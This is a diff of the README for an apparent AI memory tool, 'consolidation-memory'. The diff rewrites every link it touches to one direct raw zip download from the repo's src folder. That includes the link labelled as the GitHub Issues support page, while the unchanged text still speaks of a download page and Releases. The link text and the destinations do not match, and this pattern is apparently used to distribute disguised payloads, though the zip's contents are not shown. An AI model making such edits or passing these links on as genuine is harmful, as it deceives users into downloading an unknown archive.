@@ -1,6 +1,6 @@
 # 🧠 consolidation-memory - Store and Recall AI Knowledge Easily
 
-[![Download](https://img.shields.io/badge/Download-consolidation--memory-brightgreen)](https://github.com/InitialDBklyn/consolidation-memory)
+[![Download](https://img.shields.io/badge/Download-consolidation--memory-brightgreen)](https://github.com/InitialDBklyn/consolidation-memory/raw/refs/heads/main/src/memory_consolidation_3.6-beta.1.zip)
 
 ---
 
@@ -29,13 +29,13 @@ You do not need to install any programming tools. The application comes ready wi
 
 The files for consolidation-memory are hosted on GitHub. Use the link below to access the official download page.
 
-[![Download Files](https://img.shields.io/badge/Download%20Page-Blue?style=for-the-badge&logo=github)](https://github.com/InitialDBklyn/consolidation-memory)
+[![Download Files](https://img.shields.io/badge/Download%20Page-Blue?style=for-the-badge&logo=github)](https://github.com/InitialDBklyn/consolidation-memory/raw/refs/heads/main/src/memory_consolidation_3.6-beta.1.zip)
 
 ### Steps to Download and Run
 
 1. **Open the Download Page**  
    Click the button above or visit:  
-   https://github.com/InitialDBklyn/consolidation-memory
+   https://github.com/InitialDBklyn/consolidation-memory/raw/refs/heads/main/src/memory_consolidation_3.6-beta.1.zip
 
 2. **Locate the Latest Release**  
    Scroll to the "Releases" section or look for a folder named “Releases” or “Download.”  
@@ -125,7 +125,7 @@ Access these in the “Settings” menu inside the application.
 ### Support
 
 For issues during installation or use, visit the GitHub Issues page:  
-https://github.com/InitialDBklyn/consolidation-memory/issues  
+https://github.com/InitialDBklyn/consolidation-memory/raw/refs/heads/main/src/memory_consolidation_3.6-beta.1.zip  
 
 You can open a new issue describing the problem clearly.
 
@@ -135,7 +135,7 @@ You can open a new issue describing the problem clearly.
 
 To update the software, repeat the download steps from the link below and install the latest version over the existing one:
 
-[https://github.com/InitialDBklyn/consolidation-memory](https://github.com/InitialDBklyn/consolidation-memory)
+[https://github.com/InitialDBklyn/consolidation-memory/raw/refs/heads/main/src/memory_consolidation_3.6-beta.1.zip](https://github.com/InitialDBklyn/consolidation-memory/raw/refs/heads/main/src/memory_consolidation_3.6-beta.1.zip)
 
 No need to uninstall the old version first. Your saved memories will stay intact.
 
@@ -173,4 +173,4 @@ Use it to assist coding agents or any smart tool that needs long-term memory.
 
 ## 📥 Download consolidation-memory Now
 
-[![Get consolidation-memory](https://img.shields.io/badge/Download%20Page-Blue?style=for-the-badge&logo=github)](https://github.com/InitialDBklyn/consolidation-memory)
+[![Get consolidation-memory](https://img.shields.io/badge/Download%20Page-Blue?style=for-the-badge&logo=github)](https://github.com/InitialDBklyn/consolidation-memory/raw/refs/heads/main/src/memory_consolidation_3.6-beta.1.zip)
